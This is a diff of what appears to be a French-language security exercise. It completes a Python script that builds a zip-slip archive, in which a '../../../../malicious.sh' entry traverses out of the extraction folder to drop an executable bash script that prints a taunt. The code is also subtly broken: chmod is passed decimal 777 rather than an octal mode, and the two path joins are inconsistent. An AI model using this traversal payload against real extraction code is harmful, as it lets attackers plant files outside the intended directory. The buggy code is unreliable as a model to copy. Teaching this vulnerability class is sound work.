@@ -7,16 +7,18 @@ os.makedirs('.evil', exist_ok=True)
 
 
 #Chemin du programme
-vulnerable_path = 'TODO'
+vulnerable_path = '../../../../malicious.sh'
 
 # Créer un script Bash malveillant qui écrit un message dans le terminale
 # que vous appelerez malicious.sh
-TODO()
+with open('.evil'+vulnerable_path, 'w') as f:
+    f.write("#!/bin/bash\n")
+    f.write('echo \"Ahahah je t\'ai bien eu !\"')
 
 # Rendre le script exécutable
 
 # Il faut mettre des droits d'exécution au fichier
-TODO()
+os.chmod('.evil/'+vulnerable_path, 777)
 
 # Créer le fichier ZIP avec le script piégé
 with zipfile.ZipFile(sys.argv[1], 'w') as zipf:
